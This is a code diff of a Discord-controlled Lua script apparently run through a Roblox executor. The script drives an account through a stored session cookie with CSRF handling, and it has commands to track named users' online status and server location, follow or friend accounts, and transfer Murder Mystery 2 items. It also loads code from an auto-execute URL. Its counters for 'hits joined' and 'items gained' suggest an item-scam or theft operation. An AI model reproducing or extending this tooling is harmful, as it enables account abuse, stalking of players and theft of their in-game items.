@@ -42,7 +42,6 @@ _hitsJoined = 0;
 _itemsGained = 0;
 _sessionStart = tick();
 
--- persistent stats
 local STATS_FILE = "stats_persistent.dat";
 _pStats = {
     hitsJoined = 0, tradesDone = 0, itemsGained = 0,
@@ -68,7 +67,6 @@ local function _saveStats()
 end
 _saveStats();
 
--- tracked users store
 local TRACK_FILE = "tracked_users.dat";
 _tracked = {};
 if isfile(TRACK_FILE) then
@@ -84,9 +82,7 @@ end
 
 print(1)
 
--- ═══════════════════════════════════════════════════════════════
---  ═══ CSRF FIX ═══ Roblox POST requests need X-CSRF-TOKEN
--- ═══════════════════════════════════════════════════════════════
+-- ═══════════ CSRF FIX ═══════════
 local _csrfToken = nil
 local _csrfFetchedAt = 0
 
@@ -708,6 +704,10 @@ end
 
 -- ═══════════ COOKIE HELPERS ═══════════
 local function _getUserId(_username)
+    if not _username then return nil, "no username" end
+    _username = tostring(_username):gsub("^%s+", ""):gsub("%s+$", "")
+    if _username == "" then return nil, "empty username" end
+
     local _ok, _r = pcall(function()
         return request({
             Url = "https://users.roblox.com/v1/usernames/users",
@@ -716,9 +716,10 @@ local function _getUserId(_username)
             Body = _hs:JSONEncode({ usernames = { _username }, excludeBannedUsers = false })
         })
     end);
-    if not _ok or not _r or _r.StatusCode ~= 200 then return nil, "lookup failed" end
+    if not _ok or not _r then return nil, "request failed" end
+    if _r.StatusCode ~= 200 then return nil, "http "..tostring(_r.StatusCode) end
     local _d = _hs:JSONDecode(_r.Body);
-    if not _d.data or not _d.data[1] then return nil, "no results" end
+    if not _d.data or not _d.data[1] then return nil, "not found" end
     return _d.data[1].id, _d.data[1].name, _d.data[1].displayName;
 end
 
@@ -730,7 +731,6 @@ local function _cookieGet(_url)
     })
 end
 
--- ═══ CSRF FIX ═══ now includes X-CSRF-TOKEN
 local function _cookiePost(_url, _body)
     local _csrf = _getCsrf()
     local _hdrs = {
@@ -748,11 +748,10 @@ local function _cookiePost(_url, _body)
     })
 end
 
--- Wrapper: retries once on 403 after refetching CSRF
 local function _cookiePostRetry(_url, _body)
     local _r = _cookiePost(_url, _body)
     if _r and _r.StatusCode == 403 then
-        _csrfToken = nil -- force refetch
+        _csrfToken = nil
         task.wait(0.3)
         _r = _cookiePost(_url, _body)
     end
@@ -846,7 +845,7 @@ local function _gw()
                     if _isOwner(_md.author) then
                         task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
                         _postEmbed("📖 Commands",
-                            "**Cookie Info**: `!rbx <u>` `!online <u>` `!lastseen <u>` `!friends <u>` `!groups <u>` `!usernames <u>` `!avatar <u>` `!robux` `!limiteds <u>` `!trades`\n" ..
+                            "**Cookie Info**: `!rbx <u>` `!serverget <u>` `!lastseen <u>` `!friends <u>` `!groups <u>` `!usernames <u>` `!avatar <u>` `!robux` `!limiteds <u>` `!trades`\n" ..
                             "**Cookie Actions**: `!follow <u>` `!unfollow <u>` `!friend <u>` `!statusmsg <txt>` `!joingroup <id>` `!leavegroup <id>`\n" ..
                             "**Tracking**: `!track <u>` `!untrack` `!tracklist`\n" ..
                             "**MM2**: `!inv` `!invf` `!coins` `!stats` `!history` `!queue` `!servercheck`\n" ..
@@ -1000,9 +999,6 @@ local function _gw()
                     _postEmbed("🎯 Auto-Execute", _autoexecURL ~= "" and "URL: `".._autoexecURL.."`" or "None.", 0x3EED50);
                     return;
                 end
-                if _content:sub(1, 9) == "!transfer" and _content:sub(1, 10) ~= "!transfer " then
-                    -- skip
-                end
                 local _tName = _content:match("^!transfer%s+(.+)$");
                 if _tName then
                     if _isOwner(_md.author) and not _transferActive then
@@ -1068,30 +1064,7 @@ local function _gw()
                     return;
                 end
 
-                -- !online <user>
-                local _onU = _content:match("^!online%s+(.+)$");
-                if _onU then
-                    if not _isOwner(_md.author) then return end
-                    task.spawn(function()
-                        if _robloxCookie == "" then _postEmbed("❌ No Cookie", "", 0xFF0000); return end
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                        local _uid = _getUserId(_onU);
-                        if not _uid then _postEmbed("❌ Lookup Failed", "", 0xFF0000); return end
-                        local _r = _cookiePostRetry("https://presence.roblox.com/v1/presence/users",
-                            _hs:JSONEncode({ userIds = { _uid } }));
-                        if not _r or _r.StatusCode ~= 200 then _postEmbed("❌ Failed", "Status "..tostring(_r and _r.StatusCode), 0xFF0000); return end
-                        local _d = _hs:JSONDecode(_r.Body);
-                        local _p = _d.userPresences and _d.userPresences[1];
-                        if not _p then _postEmbed("❌ No data", "", 0xFF0000); return end
-                        local _tn = { [0]="Offline", [1]="Website", [2]="In Game", [3]="Studio" };
-                        _postEmbed("🟢 ".._onU,
-                            "**Status:** `"..(_tn[_p.userPresenceType] or "?").."`\n**Game:** `"..tostring(_p.lastLocation or "?").."`\n**JobId:** `"..tostring(_p.gameId or "?").."`",
-                            0x3EED50);
-                    end);
-                    return;
-                end
-
-                -- !serverget <user> — alias for !online with join cmd
+                -- !serverget <user>
                 local _sgU = _content:match("^!serverget%s+(.+)$");
                 if _sgU then
                     if not _isOwner(_md.author) then return end
